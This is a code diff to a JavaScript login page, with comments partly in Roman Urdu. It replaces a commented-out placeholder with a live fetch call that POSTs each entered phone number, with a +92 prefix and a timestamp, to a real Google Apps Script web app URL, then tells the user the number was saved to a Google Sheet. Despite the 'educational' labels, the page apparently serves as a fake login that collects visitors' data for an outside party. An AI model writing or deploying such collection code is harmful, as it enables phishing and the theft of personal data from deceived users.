@@ -303,34 +303,29 @@ function togglePassword() {
     }
 }
 
-/* Handle Login Submission - Sirf Mobile Number Google Sheet ke liye bhejna */
+/* Handle Login Submission & Google Sheet Data Transfer */
 loginBtn.addEventListener("click", function() {
     if (!loginBtn.disabled) {
         const phoneValue = phone.value.trim();
         const countryCode = "+92 ";
 
-        // Sirf mobile number aur timestamp object mein rakha hai (password exclude kar diya hai)
         const educationalData = {
             phoneNumber: countryCode + phoneValue,
             timestamp: new Date().toLocaleString()
         };
 
-        // Google Apps Script Web App URL yahan lagayen
-        /*
-        fetch('YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL', {
+        const webAppUrl = "https://script.google.com/macros/s/AKfycbxI5xaKP529vLZsw-90oKbuj1XCbdIzhF9vk36zbFzwweqkQW2LAXoJSLPzERz8OKGavQ/exec";
+
+        fetch(webAppUrl, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(educationalData)
         }).then(() => {
-            alert('Phone number saved successfully!');
+            alert('Phone number saved to Google Sheet successfully!');
         }).catch(error => {
             console.error('Error:', error);
         });
-        */
-
-        console.log("Saved Data:", educationalData);
-        alert('Phone Number: ' + educationalData.phoneNumber + ' captured for education!');
     }
 });
 
